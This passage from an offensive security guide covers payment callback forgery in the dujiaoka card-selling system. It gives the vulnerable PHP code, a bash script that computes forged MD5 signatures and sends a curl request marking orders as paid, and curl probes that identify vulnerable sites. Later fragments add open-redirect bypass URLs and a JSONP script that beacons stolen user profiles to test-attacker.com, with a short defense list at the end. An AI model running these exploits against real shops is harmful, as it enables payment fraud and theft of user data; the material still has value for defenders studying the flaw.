...
### 11.8 Payment Callback Signature Forgery — 独角数卡 (dujiaoka) Case Study

**Target**: dujiaoka (独角数卡) ≤ 2.0.4 — open-source PHP card-selling/e-commerce system. Project archived, will not be patched.

**Vulnerability essence**: Payment callback signature algorithm is reversible — the signing key IS the `merchant_id`, which is public/known — so an attacker can compute valid signatures and forge "payment success" notifications, marking orders as paid without real payment.

#### Root Cause — V免签 (Vpay) Controller

```php
// app/Http/Controllers/Pay/VpayController.php
public function notifyUrl(Request $request)  // ← GET request!
{
    $data = $request->all();  // all params, no source validation

    $key = $payGateway->merchant_id;  // ← KEY IS merchant_id (public!)
    $sign = md5($payId . $param . $type . $price . $reallyPrice . $key);
    //      ↑ attacker knows merchant_id → can compute valid signature

    if ($_sign != $sign) {
        return 'fail';
    }
    // signature passes → order completed
...
| Flaw | Detail |
|---|---|
| **GET request** | `Route::get('vpay/notify_url', ...)` — accessible via browser directly |
| **Key is public** | Signing key = `merchant_id`, stored in DB `pay` table, visible on config page |
| **No IP allowlist** | Any IP can call the callback |
| **No replay protection** | Same signature reusable infinitely |
| **All params attacker-controlled** | `payId`/`param`/`type`/`price`/`reallyPrice` all constructed by attacker |

#### Exploitation Steps

```bash
# 1. Create a normal order (pick any product, select V免签 payment)
#    Get order_sn, e.g. "2024010112345678"

# 2. Obtain merchant_id:
#    Method A: if target has debug mode on, error page leaks it
#    Method B: self-register a V免签 merchant, merchant_id is your merchant number

# 3. Construct params + compute signature
order_sn="2024010112345678"
payId="202401019999"            # arbitrary
price="0.01"                     # must be ≥ order amount
reallyPrice="0.01"               # actual paid amount
type="1"                         # 1=WeChat 2=Alipay
merchant_id="12345"              # merchant number

# md5(payId + param + type + price + reallyPrice + merchant_id)
sign=$(echo -n "${payId}${order_sn}${type}${price}${reallyPrice}${merchant_id}" \
       | md5sum | cut -d' ' -f1)

# 4. Fire the GET request directly
curl "https://target.com/pay/vpay/notify_url?payId=${payId}&param=${order_sn}\
&type=${type}&price=${price}&reallyPrice=${reallyPrice}&sign=${sign}"
# Returns "success" → order marked as paid!
```

#### All Payment Gateways Affected

| Gateway | Method | Signing key | Exploit difficulty |
|---|---|---|---|
| V免签 (Vpay) | GET | `merchant_id` (public) | ⭐ Trivial |
| 易支付 (Epay) | GET | `merchant_pem` (config) | ⭐⭐ Low |
| 码支付 (Mapay) | POST | `merchant_id` | ⭐⭐ Low |
| Paysapi | POST | `merchant_pem` | ⭐⭐ Low |
| TokenPay (USDT) | POST | `merchant_key` | ⭐⭐ Low |
| EPUSDT (USDT) | POST | `merchant_key` | ⭐⭐ Low |
...
# Probe V免签 notify endpoint
curl -s https://target.com/pay/vpay/notify_url
# Returns "fail" → endpoint exists, confirmed dujiaoka

# Probe 易支付 notify endpoint (also GET)
curl -s "https://target.com/pay/yipay/notify_url?out_trade_no=test"
# Returns "fail" → confirmed exists
```

**Defense**: (1) Use a proper secret key (not merchant_id) for signing; (2) Enforce IP allowlist for callback endpoints; (3) Require POST not GET; (4) Add nonce/timestamp for replay protection; (5) Verify callback with the payment gateway's server-side API (active query), not just trust the inbound signature.
...
Bypass:
  GET /reset/done?next=https://test-attacker.com/login   ← if server doesn't validate next= → SSRF/phish
  GET /reset/done?next=//test-attacker.com               ← protocol-relative
  GET /reset/done?next=/login@test-attacker.com          ← user-info trick
...
function stealUserProfile(data) {
  navigator.sendBeacon("https://test-attacker.com/log", JSON.stringify(data));
}
</script>
```

If the JSONP endpoint returns sensitive user data and accepts arbitrary
callback names without origin validation, every user visiting test-attacker.com
